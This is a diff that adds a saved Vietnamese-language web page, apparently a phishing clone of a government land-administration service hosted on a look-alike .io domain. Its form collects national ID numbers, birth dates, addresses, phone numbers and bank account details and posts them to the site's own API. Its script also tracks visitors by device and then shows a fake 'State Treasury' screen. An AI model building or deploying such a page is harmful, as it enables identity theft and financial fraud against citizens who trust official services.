@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="vi"><!--
+ Page saved with SingleFile 
+ url: https://kekhaidichvucong.io/dang-ky-tai-khoan 
+ saved date: Thu Mar 19 2026 00:28:10 GMT+0700 (Giờ Đông Dương)
+-->
+
+<head>
+    <meta charset="utf-8">
+    <style>
+        body {
+            transition: opacity ease-in 0.2s
+        }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="VNyaG0tT4gScfZBuw3aAPjE7gD8h3Y6O70EohTIG">
+    <title>Hệ thống thủ tục hành chính</title>
+    <link rel="stylesheet" href="assets/css/style_101.css">
+    <link rel="stylesheet" href="assets/css/style_102.css">
+    <link rel="stylesheet" href="assets/css/style_103.css">
+    <meta name="referrer" content="no-referrer">
+    <link type="image/x-icon" rel="shortcut icon" href="data:image/x-icon;base64,">
+    <style>
+        .sf-hidden {
+            display: none !important
+        }
+    </style>
+    <link rel="canonical" href="https://kekhaidichvucong.io/dang-ky-tai-khoan">
+    <meta http-equiv="content-security-policy"
+        content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline' 'self'; media-src 'self' data:; script-src 'unsafe-inline' 'self' data:; object-src 'self' data:; frame-src 'self' data:; connect-src 'self';">
+</head>
+
+<body>
+    <div id="service-registration-config" data-is-edit-mode="false"
+        data-submit-url="https://kekhaidichvucong.io/dang-ky-tai-khoan"
+        data-profile-url="https://kekhaidichvucong.io/profile" data-home-url="https://kekhaidichvucong.io"
+        style="display:none"></div>
+    <div class="container">
+
+        <div class="row">
+            <div class="col-12">
+                <div class="d-flex justify-content-between align-items-center py-3">
+
+                    <div class="col-lg-6 col-md-6 col-sm-8 col-8">
+                        <div class="d-flex align-items-center header-logo-section" style="cursor:pointer">
+                            <img src="assets/images/img_101.png" alt="Logo" class="me-2 me-md-3 logo-img">
+                            <div class="header-text-section d-md-block">
+                                <h4 class="mb-0 text-danger fw-bold header-title fs-6 fs-md-5">
+                                    HỆ THỐNG THÔNG TIN GIẢI QUYẾT THỦ TỤC HÀNH CHÍNH
+                                </h4>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-6 col-md-6 col-sm-8 col-8">
+                        <div class="d-flex justify-content-end align-items-center">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-12 mt-4">
+                <div class="d-flex justify-content-between align-items-center mb-4">
+                    <h5 class="mb-0">NỘP HỒ SƠ</h5>
+                    <div class="d-flex gap-2">
+                        <button class="btn btn-outline-secondary" onclick="submitForm()">
+                            <i class="fas fa-save me-1"></i>Lưu hồ sơ
+                        </button>
+                        <button class="btn btn-outline-danger" onclick="window.location.href='index.html'">
+                            <i class="fas fa-times me-1"></i>Đóng
+                        </button>
+                    </div>
+                </div>
+                <div class="card mb-4">
+                    <div class="card-body">
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" id="commitment" value="on">
+                            <label class="form-check-label" for="commitment">
+                                Tôi cam kết chịu trách nhiệm trước pháp luật về tính hợp pháp, chính xác của các giấy tờ
+                                có trong hồ sơ và cung cấp đầy đủ thông tin có liên quan
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0">THÔNG TIN CHUNG</h5>
+                    </div>
+                    <div class="card-body">
+                        <form>
+                            <div class="row mb-3">
+                                <div class="col-md-3 mb-3">
+                                    <label for="receiving_unit" class="form-label">Đơn vị tiếp nhận <span
+                                            class="text-danger">*</span></label>
+                                    <select class="form-select" id="don_vi_tiep_nhan_thong_tin_chung"
+                                        name="don_vi_tiep_nhan" required="">
+                                        <option value="" selected="">Chọn đơn vị tiếp nhận</option>
+                                        <option value="Chi nhánh VPĐ">Chi nhánh VPĐ...</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-3 mb-3">
+                                    <label for="support_unit" class="form-label">Đơn vị hỗ trợ</label>
+                                    <select class="form-select" id="don_vi_ho_tro_thong_tin_chung" name="don_vi_ho_tro">
+                                        <option value="" selected="">Chọn đơn vị hỗ trợ</option>
+                                        <option value="Chi nhánh Số 10">Chi nhánh Số 10</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-3 mb-3">
+                                    <label for="field" class="form-label">Lĩnh vực <span
+                                            class="text-danger">*</span></label>
+                                    <select class="form-select" id="linh_vuc_thong_tin_chung" name="linh_vuc"
+                                        required="">
+                                        <option value="" selected="">Chọn lĩnh vực</option>
+                                        <option value="G13-TN02: Đất đai">G13-TN02: Đất đai</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-3 mb-3">
+                                    <label for="procedure" class="form-label">Thủ tục hành chính <span
+                                            class="text-danger">*</span></label>
+                                    <select class="form-select" id="thu_tuc_hanh_chinh_thong_tin_chung"
+                                        name="thu_tuc_hanh_chinh" required="">
+                                        <option value="" selected="">Chọn thủ tục</option>
+                                        <option value="956 - QĐ.06.T - Cấp đổi GCN quyền sử dụng đất">956 - QĐ.06.T -
+                                            Cấp đổi Giấy chứng nhận quyền sử dụng đất</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-6 mb-3">
+                                    <label for="public_service" class="form-label">Dịch vụ công <span
+                                            class="text-danger">*</span></label>
+                                    <select class="form-select" id="dich_vu_cong_thong_tin_chung" name="dich_vu_cong"
+                                        required="">
+                                        <option value="" selected="">Chọn dịch vụ công</option>
+                                        <option value="Cấp đổi Giấy chứng nhận quyền sử dụng đất">Cấp đổi Giấy chứng
+                                            nhận quyền sử dụng đất</option>
+                                        <option value="Đăng ký quyền sử dụng đất">Đăng ký quyền sử dụng đất</option>
+                                        <option value="Chuyển nhượng quyền sử dụng đất">Chuyển nhượng quyền sử dụng đất
+                                        </option>
+                                        <option value="Thừa kế quyền sử dụng đất">Thừa kế quyền sử dụng đất</option>
+                                        <option value="Tách thửa đất">Tách thửa đất</option>
+                                        <option value="Hợp thửa đất">Hợp thửa đất</option>
+                                        <option value="Đo đạc, chỉnh lý địa giới thửa đất">Đo đạc, chỉnh lý địa giới
+                                            thửa đất</option>
+                                        <option value="Các dịch vụ khác về đất đai">Các dịch vụ khác về đất đai</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div class="card mb-4">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0">THÔNG TIN NGƯỜI NỘP HỒ SƠ</h5>
+                    </div>
+                    <div class="card-body">
+                        <form>
+                            <div class="row mb-3">
+                                <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                    <label for="applicant_name" class="form-label">Tên người nộp <span
+                                            class="text-danger">*</span></label>
+                                    <input type="text" class="form-control" id="ten_nguoi_nop_ho_so"
+                                        name="ten_nguoi_nop" placeholder="Nhập họ và tên" value="" required="">
+                                </div>
+                                <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                    <label for="applicant_birthday" class="form-label">Ngày sinh <span
+                                            class="text-danger">*</span></label>
+                                    <input type="date" class="form-control" id="ngay_sinh_nguoi_nop_ho_so"
+                                        name="ngay_sinh_nguoi_nop" value="" required="">
+                                </div>
+                                <div class="col-lg-4 col-md-12 col-sm-12 mb-3">
+                                    <label for="applicant_cmnd" class="form-label">Số CMND/CCCD <span
+                                            class="text-danger">*</span></label>
+                                    <input type="text" class="form-control" id="cmnd_nguoi_nop_ho_so"
+                                        name="cmnd_nguoi_nop" placeholder="Nhập số CMND/CCCD" value="" required="">
+                                </div>
+                                <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                    <label for="cmnd_issue_date" class="form-label">Ngày cấp <span
+                                            class="text-danger">*</span></label>
+                                    <input type="date" class="form-control" id="ngay_cap_cmnd_nguoi_nop_ho_so"
+                                        name="ngay_cap_cmnd" value="" required="">
+                                </div>
+                                <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                    <label for="cmnd_issue_place" class="form-label">Nơi cấp <span
+                                            class="text-danger">*</span></label>
+                                    <input type="text" class="form-control" id="noi_cap_cmnd_nguoi_nop_ho_so"
+                                        name="noi_cap_cmnd" placeholder="Nhập nơi cấp CMND/CCCD" value="" required="">
+                                </div>
+                                <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                    <label for="applicant_phone" class="form-label">Số điện thoại <span
+                                            class="text-danger">*</span></label>
+                                    <input type="tel" class="form-control" id="so_dien_thoai_nguoi_nop_ho_so"
+                                        name="so_dien_thoai_nguoi_nop" placeholder="Nhập số điện thoại" value=""
+                                        required="" maxlength="10" pattern="[0-9]{10}"
+                                        title="Số điện thoại phải đúng 10 chữ số">
+                                </div>
+                                <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                    <label for="administrative_area" class="form-label">Địa danh hành chính <span
+                                            class="text-danger">*</span></label>
+                                    <select class="form-select" id="dia_danh_hanh_chinh_nguoi_nop_ho_so"
+                                        name="dia_danh_hanh_chinh" required="">
+                                        <option value="" selected="">Chọn tỉnh/thành phố</option>
+                                        <option value="hanoi">Hà Nội</option>
+                                        <option value="haiphong">Hải Phòng</option>
+                                        <option value="danang">Đà Nẵng</option>
+                                        <option value="hcm">Hồ Chí Minh</option>
+                                        <option value="cantho">Cần Thơ</option>
+                                        <option value="angiang">An Giang</option>
+                                        <option value="baria-vungtau">Bà Rịa - Vũng Tàu</option>
+                                        <option value="bacgiang">Bắc Giang</option>
+                                        <option value="bacninh">Bắc Ninh</option>
+                                        <option value="bentre">Bến Tre</option>
+                                        <option value="binhduong">Bình Dương</option>
+                                        <option value="binhdinh">Bình Định</option>
+                                        <option value="binhphuoc">Bình Phước</option>
+                                        <option value="camau">Cà Mau</option>
+                                        <option value="caobang">Cao Bằng</option>
+                                        <option value="daklak">Đắk Lắk</option>
+                                        <option value="daknong">Đắk Nông</option>
+                                        <option value="dienbien">Điện Biên</option>
+                                        <option value="hagiang">Hà Giang</option>
+                                        <option value="hanam">Hà Nam</option>
+                                        <option value="hungyen">Hưng Yên</option>
+                                        <option value="khanhhoa">Khánh Hòa</option>
+                                        <option value="kiengiang">Kiên Giang</option>
+                                        <option value="kontum">Kon Tum</option>
+                                        <option value="laichau">Lai Châu</option>
+                                        <option value="langson">Lạng Sơn</option>
+                                        <option value="laocai">Lào Cai</option>
+                                        <option value="longan">Long An</option>
+                                        <option value="namdinh">Nam Định</option>
+                                        <option value="nghean">Nghệ An</option>
+                                        <option value="ninhbinh">Ninh Bình</option>
+                                        <option value="ninhthuan">Ninh Thuận</option>
+                                        <option value="phutho">Phú Thọ</option>
+                                        <option value="quangninh">Quảng Ninh</option>
+                                        <option value="thainguyen">Thái Nguyên</option>
+                                        <option value="dongnai">Đồng Nai</option>
+                                        <option value="tayninh">Tây Ninh</option>
+                                        <option value="vinhlong">Vĩnh Long</option>
+                                        <option value="thaibinh">Thái Bình</option>
+                                        <option value="hoabinh">Hòa bình</option>
+                                        <option value="sonla">Sơn La</option>
+                                        <option value="yenbai">Yên Bái</option>
+                                        <option value="tuyenquang">Tuyên Quang</option>
+                                        <option value="thanhhoa">Thanh Hóa</option>
+                                    </select>
+                                </div>
+                                <div class="col-lg-4 col-md-12 col-sm-12 mb-3">
+                                    <label for="detailed_address" class="form-label">Địa chỉ chi tiết <span
+                                            class="text-danger">*</span></label>
+                                    <input type="text" class="form-control" id="dia_chi_chi_tiet_nguoi_nop_ho_so"
+                                        name="dia_chi_chi_tiet" placeholder="Nhập địa chỉ chi tiết" value=""
+                                        required="">
+                                </div>
+                                <div class="col-12">
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="co_nguoi_uy_quyen"
+                                            name="co_nguoi_uy_quyen" value="on">
+                                        <label class="form-check-label" for="co_nguoi_uy_quyen">
+                                            <strong>Người ủy quyền</strong>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div class="card mb-4" id="authorized-person-section" style="display:none">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0">THÔNG TIN NGƯỜI ỦY QUYỀN</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row mb-3">
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Tên người ủy quyền <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="ten_nguoi_uy_quyen"
+                                    name="ten_nguoi_uy_quyen" placeholder="Nhập họ và tên">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Ngày sinh <span class="text-danger">*</span></label>
+                                <input type="date" class="form-control" id="ngay_sinh_nguoi_uy_quyen"
+                                    name="ngay_sinh_nguoi_uy_quyen">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Số CMND/CCCD <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="cmnd_nguoi_uy_quyen"
+                                    name="cmnd_nguoi_uy_quyen" placeholder="Nhập số CMND/CCCD">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Ngày cấp <span class="text-danger">*</span></label>
+                                <input type="date" class="form-control" id="ngay_cap_cmnd_uy_quyen"
+                                    name="ngay_cap_cmnd_uy_quyen">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Nơi cấp <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="noi_cap_cmnd_uy_quyen"
+                                    name="noi_cap_cmnd_uy_quyen" placeholder="Nhập nơi cấp">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Số điện thoại <span class="text-danger">*</span></label>
+                                <input type="tel" class="form-control" id="sdt_nguoi_uy_quyen" name="sdt_nguoi_uy_quyen"
+                                    placeholder="Nhập số điện thoại" maxlength="10" pattern="[0-9]{10}">
+                            </div>
+                            <div class="col-lg-8 col-md-12 col-sm-12 mb-3">
+                                <label class="form-label">Địa chỉ chi tiết <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="dia_chi_nguoi_uy_quyen"
+                                    name="dia_chi_nguoi_uy_quyen" placeholder="Nhập địa chỉ chi tiết">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card mb-4">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0">THÔNG TIN NGƯỜI SỬ DỤNG ĐẤT, CHỦ SỞ HỮU TÀI SẢN GẮN LIỀN VỚI ĐẤT, NGƯỜI QUẢN LÝ
+                            ĐẤT</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row mb-3">
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Tên người sử dụng đất <span
+                                        class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="ten_nguoi_su_dung_dat_thong_tin"
+                                    name="ten_nguoi_su_dung_dat" placeholder="Nhập họ và tên" value="" required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Ngày sinh <span class="text-danger">*</span></label>
+                                <input type="date" class="form-control" id="ngay_sinh_nguoi_su_dung_dat"
+                                    name="ngay_sinh_su_dung_dat" value="" required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Số CMND/CCCD <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="cmnd_nguoi_su_dung_dat"
+                                    name="cmnd_su_dung_dat" placeholder="Nhập số CMND/CCCD" value="" required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Ngày cấp <span class="text-danger">*</span></label>
+                                <input type="date" class="form-control" id="ngay_cap_cmnd_su_dung_dat"
+                                    name="ngay_cap_cmnd_su_dung_dat" value="" required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Nơi cấp <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="noi_cap_cmnd_su_dung_dat"
+                                    name="noi_cap_cmnd_su_dung_dat" placeholder="Nhập nơi cấp CMND/CCCD" value=""
+                                    required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Số điện thoại <span class="text-danger">*</span></label>
+                                <input type="tel" class="form-control" id="so_dien_thoai_nguoi_su_dung_dat"
+                                    name="so_dien_thoai_su_dung_dat" placeholder="Nhập số điện thoại" value=""
+                                    required="" maxlength="10" pattern="[0-9]{10}"
+                                    title="Số điện thoại phải đúng 10 chữ số">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label class="form-label">Địa danh hành chính <span class="text-danger">*</span></label>
+                                <select class="form-select" id="dia_danh_hc_su_dung_dat" name="dia_danh_hc_su_dung_dat"
+                                    required="">
+                                    <option value="" selected="">Chọn tỉnh/thành phố</option>
+                                    <option value="hanoi">Hà Nội</option>
+                                    <option value="hcm">Hồ Chí Minh</option>
+                                    <option value="danang">Đà Nẵng</option>
+                                    <option value="haiphong">Hải Phòng</option>
+                                    <option value="cantho">Cần Thơ</option>
+                                    <option value="binhduong">Bình Dương</option>
+                                    <option value="dongnai">Đồng Nai</option>
+                                    <option value="khanhhoa">Khánh Hòa</option>
+                                    <option value="thanhhoa">Thanh Hóa</option>
+                                    <option value="nghean">Nghệ An</option>
+                                    <option value="bacninh">Bắc Ninh</option>
+                                    <option value="quangninh">Quảng Ninh</option>
+                                </select>
+                            </div>
+                            <div class="col-lg-4 col-md-12 col-sm-12 mb-3">
+                                <label class="form-label">Địa chỉ chi tiết <span class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="dia_chi_chi_tiet_nguoi_su_dung_dat"
+                                    name="dia_chi_chi_tiet_su_dung_dat" placeholder="Nhập địa chỉ chi tiết" value=""
+                                    required="">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card mb-4">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0">THÔNG TIN NGÂN HÀNG KHAI BÁO THUẾ</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row mb-3">
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label for="bank_name" class="form-label">Ngân hàng <span
+                                        class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="ngan_hang" name="ngan_hang"
+                                    placeholder="Nhập tên ngân hàng" value="" required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label for="account_number" class="form-label">Số tài khoản <span
+                                        class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="so_tai_khoan" name="so_tai_khoan"
+                                    placeholder="Nhập số tài khoản" value="" required="">
+                            </div>
+                            <div class="col-lg-4 col-md-6 col-sm-12 mb-3">
+                                <label for="account_holder" class="form-label">Chủ tài khoản <span
+                                        class="text-danger">*</span></label>
+                                <input type="text" class="form-control" id="chu_tai_khoan" name="chu_tai_khoan"
+                                    placeholder="Nhập tên chủ tài khoản" value="" required="">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-end mb-4" style="margin-top:20px">
+                    <div class="d-flex justify-content-end gap-2">
+                        <button class="btn btn-outline-secondary" onclick="submitForm()">
+                            <i class="fas fa-save me-1"></i>Lưu hồ sơ
+                        </button>
+                        <button class="btn btn-outline-danger" onclick="window.location.href='index.html'">
+                            <i class="fas fa-times me-1"></i>Đóng
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade sf-hidden" id="commitmentModal" tabindex="-1" aria-labelledby="commitmentModalLabel"
+        aria-hidden="true">
+
+    </div>
+
+    <!-- Toast notification -->
+    <div id="toast-container"
+        style="position:fixed;top:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;"></div>
+
+    <!-- Kho bạc nhà nước section (hidden initially) -->
+    <div class="container" id="khobac-section" style="display:none;">
+        <div class="card mb-4" style="margin-top:20px;">
+            <div class="card-header bg-warning">
+                <h5 class="mb-0">KHO BẠC NHÀ NƯỚC</h5>
+            </div>
+            <div class="card-body">
+                <button class="btn btn-primary" onclick="checkImage()"
+                    style="background:#903938;border:none;padding:10px 24px;border-radius:8px;">
+                    📋 Xem
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Thông tin kho bạc modal -->
+    <div id="imageModal"
+        style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:10000;align-items:center;justify-content:center;">
+        <div
+            style="background:#fff;border-radius:12px;max-width:500px;width:92%;max-height:90vh;overflow:auto;box-shadow:0 12px 40px rgba(0,0,0,0.3);">
+            <!-- Header -->
+            <div
+                style="background:#4267B2;color:#fff;padding:14px 20px;border-radius:12px 12px 0 0;display:flex;justify-content:space-between;align-items:center;">
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <span style="font-size:18px;">🏛</span>
+                    <strong style="font-size:15px;">THÔNG TIN KHO BẠC</strong>
+                </div>
+                <button onclick="closeImageModal()"
+                    style="background:none;border:none;font-size:22px;cursor:pointer;color:#fff;line-height:1;">✕</button>
+            </div>
+            <!-- Body -->
+            <div style="padding:20px;text-align:center;">
+                <div id="imageGallery" style="display:flex;flex-wrap:wrap;gap:8px;justify-content:center;"></div>
+                <p id="imageCount" style="margin-top:12px;color:#666;font-size:14px;"></p>
+            </div>
+            <!-- Footer -->
+            <div style="padding:0 20px 16px 20px;display:flex;flex-direction:column;gap:8px;">
+                <a id="imageDownloadBtn" href="" download="ho-so.jpg"
+                    style="display:block;text-align:center;padding:10px;background:#4267B2;color:#fff;border-radius:8px;text-decoration:none;font-size:14px;font-weight:600;">
+                    ⬇ Tải ảnh về
+                </a>
+                <button onclick="closeImageModal()"
+                    style="display:block;width:100%;padding:10px;background:#f0f0f0;color:#333;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;">
+                    ✕ Đóng
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .toast-msg {
+            padding: 12px 20px;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+            animation: toastIn 0.3s ease, toastOut 0.3s ease 2.7s forwards;
+            max-width: 380px;
+        }
+
+        .toast-msg.success {
+            background: #27ae60;
+        }
+
+        .toast-msg.error {
+            background: #e74c3c;
+        }
+
+        .toast-msg.info {
+            background: #3498db;
+        }
+
+        .toast-msg.warning {
+            background: #f39c12;
+        }
+
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateX(40px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes toastOut {
+            from {
+                opacity: 1;
+            }
+
+            to {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+        }
+
+        .field-error {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.2) !important;
+            animation: shakeField 0.4s ease;
+        }
+
+        @keyframes shakeField {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+    </style>
+
+    <script>
+        // Toast function
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = 'toast-msg ' + type;
+            toast.textContent = message;
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        // Phone validation
+        document.querySelectorAll('input[type="tel"]').forEach(input => {
+            input.addEventListener('input', function () {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+            });
+        });
+
+        // Toggle người ủy quyền
+        document.getElementById('co_nguoi_uy_quyen').addEventListener('change', function () {
+            document.getElementById('authorized-person-section').style.display = this.checked ? 'block' : 'none';
+        });
+
+        let currentSubmissionId = null;
+
+        // Check if this device already has a submission (by IP+UA on server)
+        async function checkDevice() {
+            try {
+                const res = await fetch('/api/public/check-device');
+                const data = await res.json();
+                if (data.found) {
+                    currentSubmissionId = data.id;
+                    showKhobacSection();
+                }
+            } catch (e) { }
+        }
+        checkDevice();
+
+        function showKhobacSection() {
+            document.getElementById('khobac-section').style.display = 'block';
+        }
+
+        // Submit form
+        async function submitForm() {
+            // Reset previous highlights
+            document.querySelectorAll('.field-error').forEach(el => el.classList.remove('field-error'));
+
+            // 1. Check commitment checkbox
+            const commitment = document.getElementById('commitment');
+            if (!commitment.checked) {
+                showToast('Vui lòng tích xác nhận cam kết trước khi nộp hồ sơ', 'warning');
+                commitment.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                commitment.parentElement.style.outline = '2px solid #e74c3c';
+                commitment.parentElement.style.borderRadius = '6px';
+                setTimeout(() => commitment.parentElement.style.outline = '', 3000);
+                return;
+            }
+
+            // 2. Check all required fields (except in hidden sections)
+            const requiredFields = document.querySelectorAll('input[required], select[required]');
+            for (const field of requiredFields) {
+                // Skip fields inside hidden sections
+                const section = field.closest('[style*="display:none"], [style*="display: none"]');
+                if (section) continue;
+
+                if (!field.value || field.value.trim() === '') {
+                    const label = field.closest('.col-lg-4, .col-lg-8, .col-md-3, .col-md-6, .col-md-12, .col-12')
+                        ?.querySelector('.form-label, label');
+                    const fieldName = label ? label.textContent.replace('*', '').trim() : 'Trường bắt buộc';
+                    showToast(`Vui lòng điền: ${fieldName}`, 'warning');
+                    field.classList.add('field-error');
+                    field.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    field.focus();
+                    return;
+                }
+            }
+
+            // 3. Validate phone numbers (10 digits)
+            const phones = document.querySelectorAll('input[type="tel"]');
+            for (const phone of phones) {
+                const section = phone.closest('[style*="display:none"], [style*="display: none"]');
+                if (section) continue;
+                if (phone.value && phone.value.length !== 10) {
+                    showToast('Số điện thoại phải đúng 10 chữ số', 'warning');
+                    phone.classList.add('field-error');
+                    phone.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    phone.focus();
+                    return;
+                }
+            }
+
+            // 4. Collect data
+            const data = {};
+            document.querySelectorAll('input, select').forEach(el => {
+                if (el.name && el.type !== 'checkbox') data[el.name] = el.value;
+                if (el.type === 'checkbox') data[el.name] = el.checked;
+            });
+
+            try {
+                const res = await fetch('/api/submissions', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await res.json();
+                if (result.success) {
+                    showToast('Nộp hồ sơ thành công! Mã: ' + result.id, 'success');
+                    currentSubmissionId = result.id;
+                    showKhobacSection();
+                    document.getElementById('khobac-section').scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    showToast(result.error || 'Không thể nộp hồ sơ', 'error');
+                }
+            } catch (e) {
+                showToast('Lỗi kết nối server. Vui lòng thử lại.', 'error');
+            }
+        }
+
+        // Check image (button click)
+        async function checkImage() {
+            if (!currentSubmissionId) {
+                showToast('Không tìm thấy mã hồ sơ', 'error');
+                return;
+            }
+            try {
+                const res = await fetch('/api/public/submissions/' + currentSubmissionId + '/image');
+                const data = await res.json();
+                if (data.hasImage) {
+                    const gallery = document.getElementById('imageGallery');
+                    gallery.innerHTML = `<img src="${data.image_url}" alt="Ảnh hồ sơ" style="max-width:100%;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.15);">`;
+                    document.getElementById('imageCount').textContent = 'Tổng số: 1 ảnh';
+                    document.getElementById('imageDownloadBtn').href = data.image_url;
+                    document.getElementById('imageModal').style.display = 'flex';
+                } else {
+                    showToast(data.message || 'Hệ thống chưa nhận dữ liệu hồ sơ', 'warning');
+                }
+            } catch (e) {
+                showToast('Lỗi kết nối. Vui lòng thử lại.', 'error');
+            }
+        }
+
+        function closeImageModal() {
+            document.getElementById('imageModal').style.display = 'none';
+        }
+        document.getElementById('imageModal').addEventListener('click', function (e) {
+            if (e.target === this) closeImageModal();
+        });
+        document.addEventListener('keydown', e => { if (e.key === 'Escape') closeImageModal(); });
+    </script>
+</body>
+
+</html>
